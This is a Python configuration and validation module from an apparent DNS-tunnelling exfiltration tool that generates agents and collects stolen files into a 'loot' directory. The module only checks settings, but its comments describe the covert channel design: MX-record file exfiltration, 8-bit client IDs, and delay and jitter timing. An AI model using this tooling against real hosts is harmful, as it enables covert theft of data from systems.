#!/usr/bin/env python3
"""
DNSemble - Centralized configuration parsing and validation.

Every user-supplied value (ports, timers, addresses, domain pools,
embedded paths) is validated here before it reaches the server, the
builder, or a generated agent.  Validation failures raise ConfigError
with an actionable message; the CLI turns that into a nonzero exit.
"""

import math
import re
import socket
import string

from core.domains import validate_domain_list


class ConfigError(Exception):
    """Raised when a user-supplied configuration value is invalid."""


# ---------------------------------------------------------------------------
# Acceptable ranges
# ---------------------------------------------------------------------------
MIN_PORT = 1
MAX_PORT = 65535

# Per-query delay / jitter in milliseconds.  10 minutes per query is far
# beyond any realistic transfer; anything larger is almost certainly a
# unit mistake (seconds vs milliseconds).
MAX_DELAY_MS = 600000

# Client IDs: 0 is reserved for the pre-negotiation state, agents pick 1-255.
MIN_CLIENT_ID = 1
MAX_CLIENT_ID = 255

_HOSTNAME_CHARS = set(string.ascii_letters + string.digits + "-.")
# Domain-name label syntax shared by server addresses and domain pools.
_LABEL_RE = re.compile(r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)$")

_IPV4_RE = re.compile(
    r"^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}"
    r"(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$")


def is_ipv4(value):
    return bool(_IPV4_RE.match(value))


def is_hostname(value):
    """True for a syntactically valid DNS hostname (dots allowed)."""
    if not value or len(value) > 253 or set(value) - _HOSTNAME_CHARS:
        return False
    labels = value.split(".")
    return all(_LABEL_RE.match(l) for l in labels)


def validate_port(port):
    try:
        port_int = int(port)
    except (TypeError, ValueError):
        raise ConfigError(f"Port must be an integer, got: {port!r}")
    if isinstance(port, float) and port_int != port:
        raise ConfigError(f"Port must be an integer, got: {port!r}")
    if not (MIN_PORT <= port_int <= MAX_PORT):
        raise ConfigError(
            f"Port must be between {MIN_PORT} and {MAX_PORT}, got: {port}")
    return port_int


def validate_timing(delay_ms, jitter_ms):
    """Delay and jitter in milliseconds, both non-negative and finite."""
    for name, value in (("--delay", delay_ms), ("--jitter", jitter_ms)):
        try:
            value = float(value)
        except (TypeError, ValueError):
            raise ConfigError(f"{name} must be a number, got: {value!r}")
        if math.isnan(value) or math.isinf(value):
            raise ConfigError(f"{name} must be a finite number, got: {value}")
        if value < 0:
            raise ConfigError(f"{name} must be >= 0, got: {value}")
        if value > MAX_DELAY_MS:
            raise ConfigError(
                f"{name} must be <= {MAX_DELAY_MS}ms, got: {value} "
                f"(delay and jitter are in milliseconds)")
    return float(delay_ms), float(jitter_ms)


def validate_upstream(upstream):
    """Upstream resolver: dotted IPv4 or resolvable-looking hostname."""
    upstream = (upstream or "").strip()
    if not upstream:
        raise ConfigError("Upstream resolver must not be empty")
    if is_ipv4(upstream) or is_hostname(upstream):
        return upstream
    raise ConfigError(
        f"Upstream resolver must be an IPv4 address or hostname, "
        f"got: {upstream!r}")


def validate_host(host, payload_key=None):
    """Server address baked into an agent.

    The Windows C agent resolves the server with inet_addr(), which only
    understands dotted IPv4 - hostnames would silently fail at runtime.
    """
    host = (host or "").strip()
    if not host:
        raise ConfigError("Server host must not be empty (--host)")
    if payload_key == "windows/c":
        if not is_ipv4(host):
            raise ConfigError(
                f"windows/c agents resolve the server with inet_addr(), "
                f"which only accepts a dotted IPv4 address, got: {host!r}  "
                f"(use an IPv4 address, or resolve the hostname yourself)")
        return host
    if is_ipv4(host) or is_hostname(host):
        return host
    raise ConfigError(
        f"Server host must be an IPv4 address or hostname, got: {host!r}")


def validate_loot_dir(loot_dir):
    loot_dir = (loot_dir or "").strip()
    if not loot_dir:
        raise ConfigError("Loot directory must not be empty (--loot-dir)")
    return loot_dir


def validate_embedded_files(files):
    """Embedded target paths: printable, newline-free, bounded length.

    The basename is what gets exfiltrated over the MX channel; anything
    longer than 255 characters cannot be reconstructed (the seq byte
    wraps at 256 and the filename channel has no chunk framing), so it
    is rejected here instead of silently corrupting the transfer.
    """
    checked = []
    for path in (files or []):
        path = path.strip()
        if not path:
            continue
        if len(path) > 4096:
            raise ConfigError(f"Embedded path too long (>4096 chars): {path[:64]}…")
        basename = path.replace("\\", "/").split("/")[-1]
        if len(basename) > 255:
            raise ConfigError(
                f"Embedded filename too long: \"{basename[:64]}…\" "
                f"({len(basename)} chars) - the filename channel carries at "
                f"most 255 characters, this file could not be reconstructed")
        checked.append(path)
    return checked


def validate_domain_pool(domains):
    """Delegates to core.domains (count, uniqueness, syntax, collisions)."""
    try:
        validate_domain_list(domains)
    except ValueError as e:
        raise ConfigError(str(e))


def build_server_config(port, upstream, loot_dir, domains,
                        session_timeout, max_sessions):
    """Validate everything the server needs; return a validated dict."""
    cfg = {
        "port": validate_port(port),
        "upstream": validate_upstream(upstream),
        "loot_dir": validate_loot_dir(loot_dir),
        "session_timeout": _validate_seconds("--session-timeout", session_timeout),
        "max_sessions": _validate_sessions(max_sessions),
    }
    if domains is not None:
        validate_domain_pool(domains)
    return cfg


def _validate_seconds(flag, value):
    try:
        value = float(value)
    except (TypeError, ValueError):
        raise ConfigError(f"{flag} must be a number, got: {value!r}")
    if math.isnan(value) or math.isinf(value) or value <= 0:
        raise ConfigError(f"{flag} must be a positive number, got: {value}")
    return value


def _validate_sessions(value):
    try:
        value = int(value)
    except (TypeError, ValueError):
        raise ConfigError(f"--max-sessions must be an integer, got: {value!r}")
    if value < 1:
        raise ConfigError(f"--max-sessions must be >= 1, got: {value}")
    if value > MAX_CLIENT_ID:
        # The transaction ID carries 8 bits of client ID, so more than 255
        # concurrent sessions can never be addressed.
        raise ConfigError(
            f"--max-sessions must be <= {MAX_CLIENT_ID} (the protocol "
            f"addresses at most {MAX_CLIENT_ID} concurrent client IDs)")
    return value


def ensure_loot_dir_writable(loot_dir):
    """Create the loot directory and confirm we can write to it."""
    import os
    try:
        os.makedirs(loot_dir, exist_ok=True)
    except OSError as e:
        raise ConfigError(f"Cannot create loot directory {loot_dir!r}: {e}")
    if not os.access(loot_dir, os.W_OK):
        raise ConfigError(f"Loot directory is not writable: {loot_dir}")


def resolve_upstream(upstream):
    """Resolve the upstream resolver to an IP once, at startup."""
    try:
        return socket.gethostbyname(upstream)
    except OSError as e:
        raise ConfigError(
            f"Cannot resolve upstream resolver {upstream!r}: {e}  "
            f"(check --upstream or your network)")
